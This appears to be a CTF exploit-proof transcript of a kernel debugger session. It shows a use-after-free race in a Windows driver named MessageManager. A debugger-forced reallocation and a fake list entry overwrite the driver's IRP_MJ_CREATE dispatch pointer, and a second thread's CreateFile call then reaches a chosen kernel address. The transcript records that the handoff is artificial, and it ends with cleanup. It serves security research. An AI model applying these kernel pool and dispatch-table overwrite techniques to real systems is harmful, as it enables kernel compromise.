@@ -1,0 +1,172 @@
+MessageManager KD-assisted RIP proof transcript
+================================================
+
+Captured: 2026-08-09 (Europe/London)
+Target: Windows Server build 26100.32995, 4 logical processors
+Harness: mm_exploit.exe rip 1 1024 0 4096
+Scope: CTF VM. KDNET key and guest credentials are intentionally omitted.
+
+This is the decisive MCP/DbgEng transcript, reduced only by removing repeated
+transport logs and duplicate stack frames. Addresses are boot-specific.
+
+1. Deterministic race
+---------------------
+
+>>> run_to_address fffff803404d16e4
+VERDICT: HIT
+
+>>> r @$t7=fffff803404d0000; r @$t6=@rbx; dd @$t6 L2
+$t6=ffff9a0494a74010
+ffff9a04`94a74010  00000003 00000000
+
+>>> assert target @rbx
+MM_TARGET_OK
+
+>>> patch target refcount=3; patch MessageManager+16e4 to jmp $
+ffff9a04`94a74010  00000003
+
+>>> run_to_address fffff803404d1502
+VERDICT: HIT
+MM_TARGET_OK
+ffff9a04`94a74010  00000002 00000000
+
+>>> restore MessageManager+16e4; run_to_address fffff803404d1706
+VERDICT: HIT
+MM_TARGET_OK
+ffff9a04`94a74010  00000002 00000000
+
+>>> run_to_address fffff803404d151b
+VERDICT: HIT
+MM_TARGET_OK
+$t1=ffff9a0494a74010
+ffff9a04`94a74010  00000000 00000000
+
+Pool page ffff9a0494a74010 region is Nonpaged pool
+*ffff9a0494a74000 size: 80 previous size: 0 (Allocated) *Tgsm
+
+The stop is immediately before the free. SetData's final decrement has already
+left one reference; Flush owns the final transition to zero.
+
+2. Debugger-assisted allocation handoff
+----------------------------------------
+
+>>> temporarily match SetData allocation tag/flags to Tgsm/0x40
+>>> run_to_address fffff803404d1668
+VERDICT: HIT
+
+>>> r @$t5=@rax; r @$t5; r @$t1
+$t5=ffff9a0494895f10
+$t1=ffff9a0494a74010
+
+The allocator returned $t5, not the freed target. For downstream validation KD
+set RAX=$t1 before the driver stored the result and copied the fake MESSAGE.
+This is a forced handoff, not a natural LFH reclaim. The original tag/flags were
+restored immediately afterward.
+
+3. Prepare direct dispatch overwrite
+------------------------------------
+
+>>> run_to_address fffff803404d1210
+VERDICT: HIT
+
+At this synchronization CREATE, RCX is DeviceObject.
+
+>>> derive DriverObject->MajorFunction[IRP_MJ_CREATE]
+$t3=ffff9a04937abe90
+$t2=fffff803404d1210
+ffff9a04`937abe90  fffff803`404d1210
+
+>>> fake.Flink = nt!DbgBreakPointWithStatus
+>>> fake.Blink = &DriverObject->MajorFunction[IRP_MJ_CREATE]
+>>> patch reciprocal unlink store at MessageManager+16f2 to jmp $
+
+ffff9a04`94a74010  02 00 00 00 00 00 00 00-40 a2 6f aa 03 f8 ff ff
+ffff9a04`94a74020  90 be 7a 93 04 9a ff ff-00 00 00 00 00 00 00 00
+ffff9a04`94a74030  00 04 00 00 00 00 00 00-01 00 00 00 00 00 00 00
+ffff9a04`94a74070  01 00 00 00 00 00 00 00
+
+fffff803`404d16ef 488908          mov qword ptr [rax],rcx
+fffff803`404d16f2 ebfe            jmp fffff803`404d16f2
+
+4. Stale caller
+---------------
+
+>>> run_to_address fffff803404d1560
+VERDICT: HIT
+
+>>> assert fake MESSAGE fields
+$t2=0000000000000000     (Buffer)
+$t3=0000000000000400     (Length)
+$t4=0000000000000001     (Linked)
+
+THREAD ffff9a0494017080  Cid 0da0.0750  RUNNING on processor 0
+Owning Process ffff9a0493d4b440  Image: mm_exploit.exe
+Call Site: MessageManager+0x1560
+...
+nt!NtDeviceIoControlFile+0x5e
+nt!KiSystemServiceCopyEnd+0x25
+
+The harness now releases its separate CREATE trigger thread on CPU 3. The stale
+caller executes the first unlink store, installs DbgBreakPointWithStatus in the
+CREATE dispatch slot, and parks at the reciprocal store.
+
+5. Controlled RIP
+-----------------
+
+>>> run_to_address fffff803aa6fa240
+VERDICT: HIT
+
+rax=fffff803aa6fa240 rbx=0000000000000025 rcx=ffff9a04931a0df0
+rdx=ffff9a0491c02d80 rsi=ffff9a04931a0df0
+rip=fffff803aa6fa240
+nt!DbgBreakPointWithStatus:
+fffff803`aa6fa240 cc              int 3
+
+THREAD ffff9a0493426080  Cid 0da0.0a2c  RUNNING on processor 3
+Owning Process ffff9a0493d4b440  Image: mm_exploit.exe
+
+nt!DbgBreakPointWithStatus
+nt!IopfCallDriver+0x5b
+nt!IofCallDriver+0x13
+nt!IopParseDevice+0x73b
+nt!ObpLookupObjectName+0xd82
+nt!ObOpenObjectByNameEx+0x223
+nt!IopCreateFile+0x1038
+nt!NtCreateFile+0x79
+nt!KiSystemServiceCopyEnd+0x25
+
+$t0=ffff9a0494017080
+$thread=ffff9a0493426080
+$proc=ffff9a0493d4b440
+MM_PROOF_PROCESS_OK
+MM_PROOF_CONCURRENT_THREAD_OK
+
+This stop is not KD's attach-time System-thread break. It is a different thread
+in the exploit process, reached through IopfCallDriver after the controlled
+MajorFunction overwrite.
+
+6. Cleanup verification
+-----------------------
+
+>>> restore CREATE dispatch and redirect trigger to MessageManager+1210
+ffff9a04`937abe90  fffff803`404d1210
+
+>>> allow stale caller past reciprocal store, then restore original bytes
+fffff803`404d16ef 488908          mov qword ptr [rax],rcx
+fffff803`404d16f2 48894108        mov qword ptr [rcx+8],rax
+fffff803`404d16f6 488912          mov qword ptr [rdx],rdx
+fffff803`404d16f9 48895310        mov qword ptr [rbx+10h],rdx
+
+The VM was then cleanly rebooted because the forced handoff intentionally wrote
+into a chunk that LFH still considered free.
+
+Guest-side final lines:
+
+[rip] 1 one-shot races completed 2 driver calls
+[rip] released 512 recent Event blocks after the target free
+[rip] 1024/1024 exact-0x68 Tfub buffers retained; signalling KD via CreateFile
+[rip] starting concurrent CreateFile trigger before stale SetData
+[rip] no stale handle reclaimed this run
+
+That final message is expected: the direct RIP proof does not use PreviousMode,
+so the harness's legacy kernel-read probe cannot report a natural reclaim.
